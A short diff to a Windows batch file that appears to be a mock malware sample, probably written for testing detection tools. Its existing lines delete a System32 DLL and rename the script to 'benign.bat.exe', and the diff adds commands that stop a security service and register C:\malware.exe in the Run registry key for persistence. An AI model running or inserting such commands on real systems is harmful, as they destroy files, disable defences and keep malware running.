@@ -15,4 +15,10 @@ rename "%0" "benign.bat.exe"
 REM Dummy malicious command
 del C:\Windows\System32\importantfile.dll
 
+REM Attempt to disable security software
+sc stop SecurityService
+
+REM Suspicious registry modification
+reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v "Malware" /t REG_SZ /d "C:\malware.exe" /f
+
 exit
